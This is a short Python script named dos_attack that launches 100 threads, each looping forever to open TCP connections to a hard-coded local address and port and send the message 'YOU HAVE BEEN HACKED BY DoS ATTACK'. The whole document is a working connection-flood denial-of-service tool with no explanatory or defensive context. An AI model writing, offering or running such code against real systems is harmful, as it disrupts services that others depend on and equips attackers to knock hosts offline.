import socket
import threading

def dos_attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send("YOU HAVE BEEN HACKED BY DoS ATTACK".encode('utf-8'))
        except socket.error:
            pass

target_ip = '192.168.11.106'
target_port = 5555

threads = []

for i in range(100): 
    thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
    thread.start()
    threads.append(thread)
    
for thread in threads:
    thread.join()
